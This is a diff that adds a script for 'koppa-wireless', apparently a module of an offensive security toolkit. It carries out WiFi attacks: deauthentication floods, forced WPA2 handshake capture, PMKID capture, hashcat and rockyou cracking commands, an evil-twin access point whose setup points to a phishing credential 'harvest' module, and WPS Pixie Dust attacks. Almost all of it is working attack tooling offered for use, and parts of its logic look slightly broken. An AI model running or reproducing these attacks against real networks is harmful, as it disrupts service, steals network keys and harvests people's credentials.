@@ -1,0 +1,122 @@
+## pkg: koppa-wireless
+## version: 1.0.0
+## desc: WiFi security testing — WPA2 capture, PMKID, deauth, evil twin
+# Usage: koppa run koppa-wireless [scan|handshake|pmkid|deauth|crack|evil-twin|wps] <iface> [args]
+
+import wireless, log
+
+fn cmd_scan(iface) {
+    log.info("===== WiFi Network Scan: {iface} =====")
+    let mon = wireless.monitor_mode(iface, true)
+    log.info("Monitor mode: {mon}")
+    let aps = wireless.scan(mon)
+    for ap in aps {
+        let enc = "ENC"
+        if not ap { enc = "OPEN" }
+        log.success("[+] {ap}  {enc}")
+    }
+    log.info("Found {len(aps)} access points")
+    wireless.monitor_mode(mon, false)
+}
+
+fn cmd_handshake(iface, bssid, channel) {
+    log.info("===== WPA2 Handshake Capture =====")
+    log.info("Target  : {bssid}")
+    log.info("Channel : {channel}")
+    let mon = wireless.monitor_mode(iface, true)
+    log.info("[*] Capturing handshake (30s)...")
+    log.info("[*] Sending deauth to force reconnect...")
+    wireless.deauth(mon, bssid, "FF:FF:FF:FF:FF:FF", 5)
+    let cap = wireless.capture_handshake(mon, bssid, channel)
+    wireless.monitor_mode(mon, false)
+    if cap {
+        log.success("[+] Handshake captured: {cap}")
+        log.info("    Crack: koppa run koppa-wireless crack {iface} {cap}")
+    }
+    if not cap {
+        log.warn("[-] No handshake captured")
+    }
+}
+
+fn cmd_pmkid(iface, bssid) {
+    log.info("===== PMKID Attack (clientless) =====")
+    let mon = wireless.monitor_mode(iface, true)
+    log.info("[*] Capturing PMKID (60s, no client needed)...")
+    let hash_file = wireless.pmkid_attack(mon, bssid)
+    wireless.monitor_mode(mon, false)
+    if hash_file {
+        log.success("[+] PMKID hash file: {hash_file}")
+        log.info("    Crack: hashcat -m 22000 {hash_file} /usr/share/wordlists/rockyou.txt")
+    }
+    if not hash_file {
+        log.warn("[-] PMKID capture failed")
+    }
+}
+
+fn cmd_crack(cap_file, wordlist) {
+    log.info("===== WPA2 Crack: {cap_file} =====")
+    if not wordlist { wordlist = "/usr/share/wordlists/rockyou.txt" }
+    log.info("[*] Cracking with {wordlist}...")
+    let key = wireless.crack_wpa(cap_file, wordlist)
+    if key {
+        log.success("[+] KEY FOUND: {key}")
+    }
+    if not key {
+        log.warn("[-] Not cracked with wordlist. Try: hashcat -m 22000 {cap_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
+    }
+}
+
+fn cmd_deauth(iface, bssid, client) {
+    log.info("===== Deauth Attack: {bssid} =====")
+    if not client { client = "FF:FF:FF:FF:FF:FF" }
+    let mon = wireless.monitor_mode(iface, true)
+    log.info("[*] Sending deauth frames...")
+    wireless.deauth(mon, bssid, client, 100)
+    wireless.monitor_mode(mon, false)
+    log.success("[+] Deauth attack complete")
+}
+
+fn cmd_evil_twin(iface, ssid, channel) {
+    log.info("===== Evil Twin AP: {ssid} =====")
+    if not channel { channel = "6" }
+    let conf = wireless.evil_twin(iface, ssid, channel)
+    log.success("[+] hostapd config: {conf}")
+    log.info("    Start: hostapd {conf}")
+    log.info("    DHCP : dnsmasq --interface={iface} --dhcp-range=192.168.1.10,192.168.1.100")
+    log.info("    Harvest with: koppa run koppa-phish harvest 192.168.1.1 80 https://target.com")
+}
+
+fn cmd_wps(iface, bssid, channel) {
+    log.info("===== WPS Attack: {bssid} =====")
+    let scan_out = wireless.wps_scan(iface, bssid)
+    log.info("{scan_out}")
+    if bssid {
+        log.info("[*] Running Pixie Dust attack...")
+        let result = wireless.pixie_dust(iface, bssid, channel)
+        log.info("{result}")
+    }
+}
+
+fn main() {
+    let mode   = __args__[0]
+    let iface  = __args__[1]
+    let arg2   = __args__[2]
+    let arg3   = __args__[3]
+    log.info("===== KOPPA Wireless v1.0 =====")
+    if not mode {
+        log.warn("Usage: koppa run koppa-wireless [scan|handshake|pmkid|deauth|crack|evil-twin|wps] <iface> [args]")
+        return
+    }
+    if not iface {
+        log.warn("Specify wireless interface (e.g. wlan0)")
+        return
+    }
+    if mode == "scan"       { cmd_scan(iface) }
+    if mode == "handshake"  { cmd_handshake(iface, arg2, arg3) }
+    if mode == "pmkid"      { cmd_pmkid(iface, arg2) }
+    if mode == "crack"      { cmd_crack(arg2, arg3) }
+    if mode == "deauth"     { cmd_deauth(iface, arg2, arg3) }
+    if mode == "evil-twin"  { cmd_evil_twin(iface, arg2, arg3) }
+    if mode == "wps"        { cmd_wps(iface, arg2, arg3) }
+    log.success("Done!")
+}
